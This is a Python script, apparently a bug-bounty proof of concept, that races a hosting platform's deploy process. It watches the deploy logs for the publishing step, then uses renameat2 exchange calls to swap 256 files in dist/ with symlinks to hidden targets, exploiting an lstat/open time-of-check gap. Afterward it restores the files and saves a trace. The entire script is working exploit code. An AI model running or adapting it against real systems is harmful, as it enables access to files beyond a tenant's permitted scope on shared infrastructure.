#!/usr/bin/env python3
"""Race regular files against hidden-target symlinks during publish."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
MARKER = b"HOSTINGER_NODE_FILE_LSTAT_OPEN_TOCTOU_GATE:r229"
PUBLISHING = b"==> Publishing"
FILE_COUNT = 256
libc = ctypes.CDLL(None, use_errno=True)
started = time.monotonic()
deadline = started + 30.0
logs_root = Path.cwd().parents[1] / "logs"
pairs = [
    (os.fsencode(f"dist/probe-{index:03d}"), os.fsencode(f"race-alternates/alt-{index:03d}"))
    for index in range(FILE_COUNT)
]
trace = {"marker": MARKER.decode(), "event": "not-observed", "fileCount": FILE_COUNT, "logsRootAccessible": logs_root.is_dir()}


def current_log() -> Path | None:
    try:
        candidates = sorted(logs_root.glob("*/*_deploy.log"), key=lambda item: item.stat().st_mtime_ns, reverse=True)[:8]
    except OSError:
        return None
    for candidate in candidates:
        try:
            if MARKER in candidate.read_bytes():
                return candidate
        except OSError:
            continue
    return None


def exchange(first: bytes, second: bytes) -> int:
    return libc.syscall(
        SYS_RENAMEAT2,
        AT_FDCWD,
        ctypes.c_char_p(first),
        AT_FDCWD,
        ctypes.c_char_p(second),
        RENAME_EXCHANGE,
    )


log_path = None
while time.monotonic() < deadline and log_path is None:
    log_path = current_log()
    if log_path is None:
        time.sleep(0.0005)

if log_path is not None:
    trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
    while time.monotonic() < deadline:
        try:
            tail = log_path.read_bytes()[-4096:]
        except OSError:
            time.sleep(0.00025)
            continue
        if PUBLISHING not in tail:
            time.sleep(0.00025)
            continue
        trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
        race_deadline = time.monotonic() + 1.5
        loops = 0
        exchanges = 0
        errors = 0
        while time.monotonic() < race_deadline:
            for first, second in pairs:
                if exchange(first, second) == 0:
                    exchanges += 1
                else:
                    errors += 1
            for first, second in reversed(pairs):
                if exchange(first, second) == 0:
                    exchanges += 1
                else:
                    errors += 1
            loops += 1
        trace.update(loops=loops, exchanges=exchanges, exchangeErrors=errors)
        break

restored = 0
for index, (first, second) in enumerate(pairs):
    probe = Path(f"dist/probe-{index:03d}")
    alternate = Path(f"race-alternates/alt-{index:03d}")
    try:
        if probe.is_symlink() and alternate.is_file() and exchange(first, second) == 0:
            restored += 1
    except OSError:
        continue
trace["restoredFiles"] = restored
trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r229-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
